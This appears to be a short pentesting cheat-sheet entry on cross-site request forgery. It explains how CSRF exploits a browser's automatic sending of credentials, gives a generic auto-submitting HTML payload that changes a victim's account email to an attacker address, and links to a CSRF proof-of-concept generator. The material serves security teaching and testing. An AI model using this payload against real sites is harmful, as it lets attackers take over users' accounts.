# CSRF

Cross-site request forgery (CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. CSRF exploits the trust that a site has in a user’s browser. This is possible because browsers send authentication tokens automatically with every request to a site. This means that if a user is logged in to a site, the site trusts the requests that it receives from the user’s browser.

## Generic payload

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

## Tools

CSRF PoC Generator - https://portswigger.net/burp/documentation/desktop/tools/engagement-tools/generate-csrf-poc